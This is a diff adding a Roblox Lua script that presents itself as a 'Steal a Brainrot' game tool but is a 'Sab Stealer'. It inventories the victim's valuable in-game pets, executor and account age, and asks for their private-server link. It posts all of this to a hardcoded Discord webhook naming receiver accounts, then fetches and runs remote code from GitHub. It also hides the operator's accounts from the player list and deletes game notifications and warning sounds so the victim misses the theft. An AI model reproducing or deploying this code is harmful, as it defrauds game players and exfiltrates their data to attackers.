@@ -1,0 +1,653 @@
+-- =============================
+-- Steal a Brainrot GUI + Webhook + Auto Execute
+-- + Script tá»± Ä‘á»™ng xá»­ lĂ½ base
+-- =============================
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local localPlayer = player
+
+-- ====== Webhook ======
+local WEBHOOK = "https://discord.com/api/webhooks/1410618016487444490/5Z5XqXUsfd7lFbxgXcCMMQqJDU_iGPc-h0AjLA09mqz-DRaIYpKP7aMVQhM6lm9oIgTv"
+
+-- ====== HĂ m Ä‘á»•i "5K"/"5M"/"2B" sang sá»‘ ======
+local function parsePrice(priceText)
+    local number = tonumber(priceText:match("[%d%.]+")) or 0
+    if priceText:find("K") then
+        return number * 1_000
+    elseif priceText:find("M") then
+        return number * 1_000_000
+    elseif priceText:find("B") then
+        return number * 1_000_000_000
+    else
+        return number
+    end
+end
+
+local config = loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/config/refs/heads/main/config"))()
+local PRICE_LIMIT = config.PRICE_LIMIT
+local targetNames = config.targetNames
+
+local function getPriority(name)
+    for _, t in ipairs(targetNames) do
+        if name:find(t.name) then
+            return t.priority
+        end
+    end
+    return math.huge
+end
+
+local function shuffle(tbl)
+    for i = #tbl, 2, -1 do
+        local j = math.random(i)
+        tbl[i], tbl[j] = tbl[j], tbl[i]
+    end
+end
+
+-- ====== HĂ m lá»c Pet trong base cá»§a mĂ¬nh (xĂ¡c Ä‘á»‹nh floor tá»« model con cĂ³ tĂªn dáº¡ng "1_clone", "2_clone", ...) ======
+local function collectValidPets()
+    local pets = {}
+
+    for _, plot in pairs(Workspace.Plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if podiums then
+                for _, podium in pairs(podiums:GetChildren()) do
+                    if podium:IsA("Model") then
+                        -- âœ… Láº¥y sá»‘ tá»« tĂªn model (vĂ­ dá»¥ "5_clone" -> 5)
+                        local num = tonumber(podium.Name:match("^(%d+)_?"))
+                        local floor = "Unknown Floor"
+
+                        if num then
+                            if num >= 1 and num <= 10 then
+                                floor = "1st Floor"
+                            elseif num >= 11 and num <= 18 then
+                                floor = "2nd Floor"
+                            else
+                                floor = "3rd Floor"
+                            end
+                        end
+
+                        -- TĂ¬m pet trong model podium Ä‘Ă³
+                        local base = podium:FindFirstChild("Base")
+                        local spawn = base and base:FindFirstChild("Spawn")
+                        if spawn and spawn:FindFirstChild("Attachment") then
+                            local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
+                            if overhead then
+                                local displayName = overhead:FindFirstChild("DisplayName")
+                                local priceLabel = overhead:FindFirstChild("Generation")
+                                if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
+                                    local nameText = displayName.Text
+                                    local priceText = priceLabel.Text
+                                    local priceNum = parsePrice(priceText)
+
+                                    if priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge then
+                                        -- âœ… ThĂªm floor vĂ o cuá»‘i thĂ´ng tin pet
+                                        table.insert(pets, string.format("%s (%s) (%s)", nameText, priceText, floor))
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            break
+        end
+    end
+
+    return pets
+end
+
+-- ====== HĂ m kiá»ƒm tra Executor ======
+local function detectExecutor()
+    local executor = "Unknown"
+    if syn then executor = "Synapse X"
+    elseif KRNL_LOADED then executor = "KRNL"
+    elseif fluxus then executor = "Fluxus"
+    elseif secure_load then executor = "Sentinel"
+    elseif getexecutorname then executor = getexecutorname()
+    elseif identifyexecutor then executor = identifyexecutor() end
+    return executor
+end
+
+-- ====== HĂ m láº¥y tuá»•i tĂ i khoáº£n ======
+local function getAccountAge()
+    return player.AccountAge
+end
+
+-- ====== Check server type ======
+local map = Workspace:WaitForChild("Map")
+local codes = map:WaitForChild("Codes")
+local main = codes:WaitForChild("Main")
+local surfaceGui = main:WaitForChild("SurfaceGui")
+local privateMsg = surfaceGui:WaitForChild("MainFrame"):WaitForChild("PrivateServerMessage")
+local serverType = privateMsg.Visible and "PRIVATE SERVER" or "PUBLIC SERVER"
+
+-- ====== HĂ m gá»­i webhook ======
+local function sendWebhook(link)
+    if player:GetAttribute("WebhookSent") then return end
+    local pets = collectValidPets()
+    if #pets == 0 then
+        warn("KhĂ´ng cĂ³ pet nĂ o Ä‘áº¡t Ä‘iá»u kiá»‡n, khĂ´ng gá»­i webhook.")
+        return
+    end
+
+    -- TĂ¡ch pets theo Æ°u tiĂªn
+    local priorityPets, randomPets = {}, {}
+    for _, pet in ipairs(pets) do
+        local petName = pet:match("^(.-) %(") or pet
+        local prio = getPriority(petName)
+        if prio ~= math.huge then
+            table.insert(priorityPets, {pet = pet, priority = prio})
+        else
+            table.insert(randomPets, pet)
+        end
+    end
+
+    -- Sáº¯p xáº¿p theo priority
+    table.sort(priorityPets, function(a, b)
+        return a.priority < b.priority
+    end)
+
+    -- Random nhĂ³m cĂ²n láº¡i
+    shuffle(randomPets)
+
+    -- GhĂ©p káº¿t quáº£ cuá»‘i
+    local orderedPets = {}
+    for _, p in ipairs(priorityPets) do
+        table.insert(orderedPets, p.pet)
+    end
+    for _, r in ipairs(randomPets) do
+        table.insert(orderedPets, r)
+    end
+
+    local lootText = table.concat(orderedPets, "\n")
+    local placeId = tostring(game.PlaceId or "")
+    local jobId = tostring(game.JobId or "")
+    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+    local embed = {
+        ["title"] = "😜 Sab Stealer - Make By Phatlee",
+        ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
+        ["fields"] = {
+            { ["name"] = "Players", ["value"] = string.format("%d/6", #game:GetService("Players"):GetPlayers()) },
+            { ["name"] = "Server Type", ["value"] = serverType },
+            { ["name"] = "👥 Player Information",
+              ["value"] = "Name: " .. player.Name ..
+                          "\nReceiver: phatle8117, banpetuytin1111, banpetuytin111140" ..
+                          "\nExecutor: " .. detectExecutor() ..
+                          "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
+            { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
+            { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
+        }
+    }
+    local payload = {
+    ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
+    ["embeds"] = {embed},
+    ["allowed_mentions"] = {
+        ["parse"] = {"everyone"}
+    }
+}
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req then
+        pcall(function()
+            req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(payload)})
+        end)
+        player:SetAttribute("WebhookSent", true)
+    else
+        warn("Executor khĂ´ng há»— trá»£ request HTTP")
+    end
+end
+
+-- ====== Public Server: tá»± Ä‘á»™ng execute thĂªm script ======
+if serverType == "PUBLIC SERVER" then
+    print("PUBLIC SERVER detected")
+    sendWebhook()
+    -- Tá»± Ä‘á»™ng load script
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
+    end)
+else
+    -- ====== Private Server GUI ======
+    print("PRIVATE SERVER detected")
+    local playerGui = player:WaitForChild("PlayerGui")
+    local screenGui = Instance.new("ScreenGui", playerGui)
+    screenGui.Name = "StealBrainrotGUI"
+    screenGui.ResetOnSpawn = false
+
+    local frame = Instance.new("Frame", screenGui)
+    frame.Size = UDim2.new(0, 320, 0, 180)
+    frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+    frame.Active = true
+    frame.Draggable = true
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
+
+    local title = Instance.new("TextLabel", frame)
+    title.Text = "Steal a Brainrot"
+    title.Font = Enum.Font.FredokaOne
+    title.TextSize = 20
+    title.TextColor3 = Color3.fromRGB(255,255,255)
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1,0,0,28)
+    title.Position = UDim2.new(0,0,0,4)
+
+    local closeButton = Instance.new("TextButton", frame)
+    closeButton.Text = "X"
+    closeButton.Font = Enum.Font.FredokaOne
+    closeButton.TextSize = 18
+    closeButton.TextColor3 = Color3.fromRGB(255,255,255)
+    closeButton.BackgroundColor3 = Color3.fromRGB(60,0,0)
+    closeButton.Size = UDim2.new(0,28,0,28)
+    closeButton.Position = UDim2.new(1,-34,0,4)
+    Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0,8)
+    closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+
+    local textBox = Instance.new("TextBox", frame)
+    textBox.Size = UDim2.new(0.9,0,0,40)
+    textBox.Position = UDim2.new(0.05,0,0,60)
+    textBox.PlaceholderText = "Please enter your private server link"
+    textBox.Text = ""
+    textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+    textBox.TextColor3 = Color3.fromRGB(255,255,255)
+    textBox.ClearTextOnFocus = false
+    textBox.Font = Enum.Font.FredokaOne
+    textBox.TextSize = 14
+    Instance.new("UICorner", textBox).CornerRadius = UDim.new(0,8)
+
+    local sendButton = Instance.new("TextButton", frame)
+    sendButton.Text = "Send"
+    sendButton.Font = Enum.Font.FredokaOne
+    sendButton.TextSize = 18
+    sendButton.TextColor3 = Color3.fromRGB(255,255,255)
+    sendButton.BackgroundColor3 = Color3.fromRGB(0,100,0)
+    sendButton.Size = UDim2.new(0.4,0,0,32)
+    sendButton.Position = UDim2.new(0.3,0,0,110)
+    Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0,8)
+
+    local function showError(msg)
+        local popup = Instance.new("Frame", screenGui)
+        popup.Size = UDim2.new(0,300,0,120)
+        popup.Position = UDim2.new(0.5,-150,0.5,-60)
+        popup.BackgroundColor3 = Color3.fromRGB(30,30,30)
+        popup.AnchorPoint = Vector2.new(0.5,0.5)
+        Instance.new("UICorner", popup).CornerRadius = UDim.new(0,12)
+        local label = Instance.new("TextLabel", popup)
+        label.Size = UDim2.new(1,-20,0.6,0)
+        label.Position = UDim2.new(0,10,0.1,0)
+        label.BackgroundTransparency = 1
+        label.Text = msg
+        label.TextColor3 = Color3.fromRGB(255,255,255)
+        label.TextScaled = true
+        label.Font = Enum.Font.FredokaOne
+        local button = Instance.new("TextButton", popup)
+        button.Size = UDim2.new(0.5,0,0.25,0)
+        button.Position = UDim2.new(0.25,0,0.7,0)
+        button.BackgroundColor3 = Color3.fromRGB(70,70,70)
+        button.Text = "OK"
+        button.TextColor3 = Color3.fromRGB(255,255,255)
+        button.Font = Enum.Font.FredokaOne
+        Instance.new("UICorner", button).CornerRadius = UDim.new(0,8)
+        button.MouseButton1Click:Connect(function() popup:Destroy() end)
+        task.delay(5,function() if popup and popup.Parent then popup:Destroy() end end)
+    end
+
+local function isValidPrivateServerLink(txt)
+    return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
+end
+
+local function handleSend()
+    local txt = textBox.Text or ""
+    if isValidPrivateServerLink(txt) then
+        -- âœ… XĂ³a GUI NGAY Láº¬P Tá»¨C khi báº¥m Send
+        screenGui:Destroy()
+
+        -- Gá»­i webhook vĂ  cháº¡y script song song (sau khi GUI bá»‹ xĂ³a)
+        task.spawn(function()
+            pcall(function()
+                sendWebhook(txt)
+            end)
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
+            end)
+        end)
+    else
+        showError("Please enter your private server link")
+    end
+end
+
+sendButton.MouseButton1Click:Connect(handleSend)
+textBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then handleSend() end
+end)
+end
+
+
+-- =============================
+-- =============================
+-- Script quáº£n lĂ½ base (Full Final)
+-- Execute dĂ¹ng ngay
+-- =============================
+local badPlayers = { "phatle8117", "ConCuTiHon02" }
+
+local plotsFolder = Workspace:FindFirstChild("Plots")
+local myBase = nil
+local duplicatedBaseDone = false
+local clonedPodiumsDone = false
+
+-- =============================
+-- TĂ¬m base cá»§a báº£n thĂ¢n
+-- =============================
+local function FindMyBase()
+	if not plotsFolder then return nil end
+	for _, plot in ipairs(plotsFolder:GetChildren()) do
+		local sign = plot:FindFirstChild("PlotSign")
+		if sign and sign:FindFirstChild("YourBase") then
+			local yourBase = sign.YourBase
+			if yourBase.Enabled == true then
+				return plot
+			end
+		end
+	end
+	return nil
+end
+
+-- =============================
+-- Giá»¯ animation khi clone
+-- =============================
+local function PreserveAnimations(original, clone)
+	for _, origDesc in ipairs(original:GetDescendants()) do
+		if origDesc:IsA("Animator") then
+			local cloneAnim = clone:FindFirstChildWhichIsA("Animator", true)
+			if cloneAnim then
+				for _, track in ipairs(origDesc:GetPlayingAnimationTracks()) do
+					local anim = Instance.new("Animation")
+					anim.AnimationId = track.Animation.AnimationId
+					local newTrack = cloneAnim:LoadAnimation(anim)
+					newTrack:Play()
+				end
+			end
+		end
+	end
+end
+
+-- =============================
+-- NhĂ¢n báº£n Model trong base (copy animation, xĂ³a gá»‘c)
+-- =============================
+local function DuplicateBaseModelsOnce(base)
+	if not base or duplicatedBaseDone then return end
+	for _, obj in ipairs(base:GetChildren()) do
+		if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
+			local clone = obj:Clone()
+			clone.Name = obj.Name .. "_clone"
+			clone.Parent = base
+			PreserveAnimations(obj, clone)
+			obj:Destroy()
+		end
+	end
+	duplicatedBaseDone = true
+	print("âœ… ÄĂ£ nhĂ¢n báº£n model trong base:", base.Name)
+end
+
+-- =============================
+-- NhĂ¢n báº£n AnimalPodiums (copy animation, xĂ³a gá»‘c)
+-- =============================
+local function DuplicateAnimalPodiumsOnce(base)
+	if not base or clonedPodiumsDone then return end
+	local podiums = base:FindFirstChild("AnimalPodiums")
+	if podiums then
+		for _, p in ipairs(podiums:GetChildren()) do
+			if p:IsA("Model") then
+				local c = p:Clone()
+				c.Name = p.Name .. "_clone"
+				c.Parent = podiums
+				PreserveAnimations(p, c)
+				p:Destroy()
+			end
+		end
+		clonedPodiumsDone = true
+		print("âœ… ÄĂ£ nhĂ¢n báº£n AnimalPodiums trong base:", base.Name)
+	end
+end
+
+-- =============================
+-- Clean táº¥t cáº£ Hitboxes trong Purchases
+-- =============================
+local function cleanHitboxes(base)
+	if not base then return end
+	local purchases = base:FindFirstChild("Purchases")
+	if not purchases then return end
+
+	local function processTarget(target)
+		if not target then return end
+		for _, obj in ipairs(target:GetDescendants()) do
+			if string.lower(obj.Name) == "hitbox" then
+				obj:Destroy()
+				print("đŸ§¹ ÄĂ£ xĂ³a hitbox:", obj:GetFullName())
+			end
+		end
+		target.DescendantAdded:Connect(function(newObj)
+			if string.lower(newObj.Name) == "hitbox" then
+				newObj:Destroy()
+				print("đŸ§¹ ÄĂ£ xĂ³a hitbox má»›i:", newObj:GetFullName())
+			end
+		end)
+	end
+
+	for _, child in ipairs(purchases:GetChildren()) do
+		processTarget(child)
+	end
+	purchases.ChildAdded:Connect(function(newChild)
+		task.wait(0.05)
+		processTarget(newChild)
+	end)
+end
+
+-- =============================
+-- XĂ³a model player xáº¥u (loop)
+-- =============================
+local function DeletePlayerModelsLoop()
+	while true do
+		for _, name in ipairs(badPlayers) do
+			local m = Workspace:FindFirstChild(name)
+			if m then
+				m:Destroy()
+				warn("â ï¸ ÄĂ£ xĂ³a model:", name)
+			end
+		end
+		task.wait(1)
+	end
+end
+
+-- =============================
+-- XĂ³a Notification & Warn sound (loop)
+-- =============================
+local function RemoveGuiAndSoundsLoop()
+	while true do
+		local pg = localPlayer:FindFirstChild("PlayerGui")
+		if pg then
+			local notif = pg:FindFirstChild("Notification")
+			if notif then
+				notif:Destroy()
+				print("đŸ”‡ ÄĂ£ xĂ³a Notification")
+			end
+		end
+		local s = ReplicatedStorage:FindFirstChild("Sounds")
+		if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
+			s.Sfx.Warn:Destroy()
+			print("đŸ”‡ ÄĂ£ xĂ³a Warn sound")
+		end
+		task.wait(1)
+	end
+end
+
+-- =============================
+-- Clone & xĂ³a base khĂ¡c
+-- =============================
+local function CloneAndReplaceOtherBases(myBase)
+	if not plotsFolder then return end
+	for _, plot in ipairs(plotsFolder:GetChildren()) do
+		if plot ~= myBase then
+			local clone = plot:Clone()
+			clone.Name = plot.Name .. "_Clone"
+			clone.Parent = plotsFolder
+			plot:Destroy()
+			print("đŸ§© ÄĂ£ clone vĂ  xĂ³a base khĂ¡c:", clone.Name)
+		end
+	end
+end
+
+-- =============================
+-- MAIN
+-- =============================
+task.spawn(function()
+	while not plotsFolder do
+		plotsFolder = Workspace:FindFirstChild("Plots")
+		task.wait(0.1)
+	end
+
+	myBase = FindMyBase()
+	if myBase then
+		print("đŸ  Base cá»§a báº¡n lĂ :", myBase.Name)
+		DuplicateBaseModelsOnce(myBase)
+		DuplicateAnimalPodiumsOnce(myBase)
+		cleanHitboxes(myBase)
+	else
+		warn("âŒ KhĂ´ng tĂ¬m tháº¥y base cá»§a báº¡n!")
+	end
+
+	CloneAndReplaceOtherBases(myBase)
+
+	task.spawn(DeletePlayerModelsLoop)
+	task.spawn(RemoveGuiAndSoundsLoop)
+end)-- XĂ³a model player xáº¥u (loop)
+-- =============================
+local function DeletePlayerModelsLoop()
+	while true do
+		for _, name in ipairs(badPlayers) do
+			local m = Workspace:FindFirstChild(name)
+			if m then
+				m:Destroy()
+				warn("ÄĂ£ xĂ³a model:", name)
+			end
+		end
+		task.wait(1)
+	end
+end
+
+task.spawn(function()
+    local CoreGui = game:GetService("CoreGui")
+
+    -- đŸ”¥ Danh sĂ¡ch cĂ¡c PlayerLabel cáº§n xĂ³a
+    local namesToRemove = {
+        "PlayerLabelphatle8117",
+        "PlayerLabelnoob123",
+        "PlayerLabelabcxyz",
+        "PlayerLabeltest999" -- thĂªm bao nhiĂªu tĂ¹y Ă½
+    }
+
+    while task.wait(0.01) do
+        -------------------------------
+        -- PHáº¦N 1: XĂ“A PLAYERLABEL
+        -------------------------------
+        local root = CoreGui:FindFirstChild("RobloxGui")
+            and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
+            and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield
+                :FindFirstChild("MenuContainer")
+                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
+                :FindFirstChild("PageViewClipper")
+                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper
+                :FindFirstChild("PageView")
+                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView
+                :FindFirstChild("PageViewInnerFrame")
+                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView.PageViewInnerFrame
+                :FindFirstChild("Players")
+
+        if root then
+            for _, name in ipairs(namesToRemove) do
+                local target = root:FindFirstChild(name)
+                if target then
+                    target:Destroy()
+                end
+            end
+        end
+
+        -------------------------------
+        -- PHáº¦N 2: XĂ“A PLAYERENTRY CĂ“ TĂN "Sweet"
+        -------------------------------
+        local success, scrollList = pcall(function()
+            return CoreGui.PlayerList
+                .Children.BodyBackground
+                .ContentFrame
+                .PlayerScrollList
+        end)
+
+        if success and scrollList then
+            local teamList = scrollList:FindFirstChild("TeamList_Neutral")
+            if teamList then
+                for _, entry in ipairs(teamList:GetChildren()) do
+                    if entry.Name:match("^PlayerEntry_") then
+                        local nameLabel = entry:FindFirstChild("ChildrenFrame")
+                            and entry.ChildrenFrame:FindFirstChild("NameFrame")
+                            and entry.ChildrenFrame.NameFrame:FindFirstChild("PlayerName")
+                            and entry.ChildrenFrame.NameFrame.PlayerName:FindFirstChild("PlayerName")
+
+                        if nameLabel and nameLabel:IsA("TextLabel") and nameLabel.Text == "Sweet" then
+                            entry:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+
+task.spawn(function()	-- đŸ”’ Danh sĂ¡ch model Ä‘Æ°á»£c báº£o vá»‡ tuyá»‡t Ä‘á»‘i
+	local protectedModels = {
+		["Witch"] = true,
+		["ShopNPCRobuxIdle"] = true,
+		["ShopNPCCash"] = true,
+		["Shop"] = true,
+		["RobuxShop"] = true,
+		["FuseMachine"] = true,
+		["CraftingMachine"] = true,
+	}
+
+	-- đŸ§© HĂ m kiá»ƒm tra model cĂ³ dáº¡ng random-id (xxxx-xxxx-xxxx-xxxx)
+	local function isRandomID(name)
+		return name:match("^[%w]+%-[%w]+%-[%w]+%-[%w]+%-[%w]+$")
+	end
+
+	while task.wait(0.1) do
+		for _, obj in ipairs(Workspace:GetChildren()) do
+			-- Chá»‰ xĂ©t cĂ¡c model náº±m trá»±c tiáº¿p trong workspace (khĂ´ng Ä‘á»¥ng folder con)
+			if obj:IsA("Model") then
+				local name = obj.Name
+
+				-- Náº¿u lĂ  model Ä‘Æ°á»£c báº£o vá»‡ â†’ bá» qua
+				if protectedModels[name] then
+					continue
+				end
+
+				-- Náº¿u lĂ  random-id â†’ bá» qua
+				if isRandomID(name) then
+					continue
+				end
+
+				-- Náº¿u trĂ¹ng tĂªn vá»›i player trong game â†’ bá» qua
+				local playerExists = Players:FindFirstChild(name)
+				if playerExists then
+					continue
+				end
+
+				-- âŒ KhĂ´ng thuá»™c báº¥t ká»³ trÆ°á»ng há»£p nĂ o á»Ÿ trĂªn â†’ xĂ³a
+				obj:Destroy()
+			end
+		end
+	end
+end)
